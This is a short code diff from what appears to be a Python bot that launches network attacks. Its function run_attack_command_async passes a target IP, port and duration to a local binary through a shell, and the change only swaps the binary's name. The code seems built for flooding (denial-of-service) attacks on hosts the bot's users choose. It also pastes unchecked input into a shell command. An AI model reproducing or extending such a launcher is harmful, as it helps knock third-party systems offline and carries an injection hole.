@@ -58,7 +58,7 @@ def user_info(user_id):
 async def run_attack_command_async(target_ip, target_port, duration):
     try:
         process1 = await asyncio.create_subprocess_shell(
-            f"./Moin {target_ip} {target_port} {duration} 900",
+            f"./new {target_ip} {target_port} {duration} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
